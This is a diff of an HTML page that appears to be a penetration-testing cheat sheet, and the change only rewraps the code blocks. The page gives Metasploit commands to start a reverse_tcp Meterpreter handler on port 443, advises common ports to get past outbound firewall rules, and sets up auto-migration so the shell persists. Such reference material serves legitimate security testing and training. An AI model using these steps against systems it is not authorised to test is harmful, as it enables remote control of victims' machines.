@@ -196,17 +196,22 @@
 
 <div class="content"><hr>
 <h3 id="start-a-metasploit-listener">Start a Metasploit Listener</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -q
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/handler
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lhost 10.10.14.10
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">443</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run
-</span></span></code></pre></div><p><small><em>Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</em></small></p>
+</span></span></code></pre></div></div>
+<p><small><em>Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</em></small></p>
 <h3 id="if-the-shell-die-immediately-we-can-try-to-migrate-it-to-another-process">If the shell die immediately, we can try to migrate it to another process</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a automigrate.rc script</span>
 </span></span><span class="line"><span class="cl">run post/windows/manage/migrate
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -q
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/handler
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
@@ -214,7 +219,8 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">443</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> AutoRunScript multi_console_command -r automigrate.rc
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
